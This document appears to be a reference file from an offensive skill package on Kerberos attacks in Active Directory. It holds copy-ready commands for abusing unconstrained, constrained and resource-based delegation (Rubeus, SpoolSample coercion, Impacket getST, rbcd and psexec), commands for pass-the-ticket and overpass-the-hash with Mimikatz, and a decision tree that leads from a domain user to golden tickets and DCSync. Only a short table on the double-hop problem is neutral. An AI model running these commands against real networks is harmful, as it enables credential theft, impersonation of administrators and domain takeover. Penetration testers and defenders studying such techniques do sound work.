# active-directory-kerberos-attacks technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 5. DELEGATION ATTACKS

### Unconstrained Delegation

Hosts with unconstrained delegation store user TGTs in memory.

```bash
# Enumerate (PowerView)
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Coerce admin authentication → capture TGT (Rubeus monitor mode)
Rubeus.exe monitor /interval:5 /nowrap

# Trigger via PrinterBug / PetitPotam → DC authenticates → TGT captured
SpoolSample.exe DC01.domain.com COMPROMISED_HOST.domain.com
```

### Constrained Delegation (S4U2Proxy)

```bash
# Enumerate
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy → get TGS for allowed service as any user
getST.py -spn cifs/target.domain.com -impersonate administrator DOMAIN/svc_account:password -dc-ip DC_IP

# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
```

### Resource-Based Constrained Delegation (RBCD)

Requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.

```bash
# 1. Create or control a computer account (MAQ > 0)
addcomputer.py -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip DC_IP DOMAIN/user:password

# 2. Set RBCD on target
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write DOMAIN/user:password

# 3. S4U2Self + S4U2Proxy from controlled account
getST.py -spn cifs/TARGET.DOMAIN.COM -impersonate administrator DOMAIN/'FAKE$':'P@ss123' -dc-ip DC_IP

# 4. Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@TARGET.DOMAIN.COM
```

---

## 6. PASS-THE-TICKET & OVERPASS-THE-HASH

### Pass-the-Ticket

```bash
# Impacket — use .ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

# Mimikatz — inject .kirbi ticket into session
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:base64_ticket_blob
```

### Overpass-the-Hash (Pass-the-Key)

Use NTLM hash to request a Kerberos TGT → pure Kerberos authentication (avoids NTLM logging).

```bash
# Impacket
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Rubeus (from Windows)
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt

# Mimikatz
sekurlsa::pth /user:administrator /domain:DOMAIN.COM /ntlm:NTLM_HASH /run:cmd.exe
```

---

## 7. KERBEROS DOUBLE HOP PROBLEM

When authenticating via Kerberos across two hops (A → B → C), B cannot forward A's credentials to C by default.

### Solutions

| Method | How | Risk |
|---|---|---|
| CredSSP | Sends actual credentials to B | Credential exposure |
| Unconstrained delegation on B | B stores A's TGT | Over-privileged |
| Constrained delegation | B allowed to delegate to C | Preferred — scoped |
| RBCD | C trusts B to delegate | Modern, flexible |
| Invoke-Command nested | `-Credential` param in nested session | Exposes password in script |

---

## 8. KERBEROS ATTACK DECISION TREE

```
AD environment — targeting Kerberos
│
├── Have domain user creds?
│   ├── Kerberoast → crack service account hashes (§3)
│   ├── Enumerate users without preauth → AS-REP roast (§2)
│   ├── Enumerate delegation → unconstrained/constrained/RBCD (§5)
│   └── Enumerate SPNs for high-value accounts
│
├── Have service account hash?
│   ├── Silver ticket for that service (§4)
│   └── If constrained delegation → S4U2Proxy chain (§5)
│
├── Have krbtgt hash?
│   ├── Golden ticket → any user, any service (§4)
│   ├── Diamond ticket → stealthier forging (§4)
│   └── Sapphire ticket → hardest to detect (§4)
│
├── Compromised host with unconstrained delegation?
│   ├── Monitor for incoming TGTs (Rubeus monitor)
│   ├── Coerce DC authentication (PrinterBug/PetitPotam)
│   └── Capture DC TGT → DCSync
│
├── Can write to target's msDS-AllowedToActOnBehalfOfOtherIdentity?
│   └── RBCD attack (§5) → create machine account + delegate
│
├── Have NTLM hash but need Kerberos auth?
│   └── Overpass-the-Hash → request TGT (§6)
│
└── Have .kirbi / .ccache ticket?
    └── Pass-the-Ticket → use directly (§6)
```
